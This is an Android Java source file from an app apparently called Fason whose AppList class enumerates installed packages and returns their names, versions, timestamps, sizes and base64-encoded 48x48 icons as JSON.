package com.fason.app.features.apps;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.util.Base64;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.List;

public final class AppList {
    // v4.0: icon size 48x48 — compact but clear enough to identify apps
    private static final int ICON_SIZE = 48;

    private AppList() {}

    public static JSONObject get(boolean includeSystem) {
        JSONObject result = new JSONObject();
        JSONArray apps = new JSONArray();
        try {
            result.put(Protocol.KEY_APPS, apps);
            PackageManager pm = FasonApp.getContext().getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
            for (PackageInfo pkg : packages) {
                try {
                    ApplicationInfo info = pkg.applicationInfo;
                    boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                    if (!includeSystem && isSystem) continue;
                    JSONObject app = new JSONObject();
                    app.put(Protocol.KEY_APP_NAME, info.loadLabel(pm).toString());
                    app.put(Protocol.KEY_PACKAGE_NAME, pkg.packageName);
                    app.put(Protocol.KEY_VERSION_NAME, pkg.versionName != null ? pkg.versionName : "");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        app.put(Protocol.KEY_VERSION_CODE, pkg.getLongVersionCode());
                    } else {
                        app.put(Protocol.KEY_VERSION_CODE, (long) pkg.versionCode);
                    }
                    app.put(Protocol.KEY_IS_SYSTEM, isSystem);
                    app.put(Protocol.KEY_ENABLED, info.enabled);
                    app.put(Protocol.KEY_TARGET_SDK, info.targetSdkVersion);
                    // v4.0: install and update timestamps
                    app.put(Protocol.KEY_INSTALL_TIME, pkg.firstInstallTime);
                    app.put(Protocol.KEY_UPDATE_TIME, pkg.lastUpdateTime);
                    try {
                        String src = info.sourceDir;
                        if (src != null) {
                            app.put(Protocol.KEY_SIZE, new File(src).length());
                        }
                    } catch (Exception ignored) {}
                    // v4.0: encode app icon as base64 PNG
                    try {
                        String iconB64 = encodeIcon(pm, info);
                        if (iconB64 != null) app.put(Protocol.KEY_ICON_B64, iconB64);
                    } catch (Exception ignored) {}
                    apps.put(app);
                } catch (Exception ignored) {}
            }
            result.put(Protocol.KEY_TOTAL, apps.length());
        } catch (Exception e) {
            try { result.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Render the app's launcher icon into a 48×48 bitmap and encode it as a
     * base64 PNG string. Returns null if the icon cannot be loaded.
     */
    private static String encodeIcon(PackageManager pm, ApplicationInfo info) {
        try {
            Drawable d = pm.getApplicationIcon(info);
            Bitmap bmp = Bitmap.createBitmap(ICON_SIZE, ICON_SIZE, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bmp);
            d.setBounds(0, 0, ICON_SIZE, ICON_SIZE);
            d.draw(canvas);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            // WEBP if available (API 30+, better compression); fallback to PNG
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                bmp.compress(Bitmap.CompressFormat.WEBP_LOSSY, 70, bos);
            } else {
                bmp.compress(Bitmap.CompressFormat.PNG, 100, bos);
            }
            bmp.recycle();
            return Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            return null;
        }
    }
}
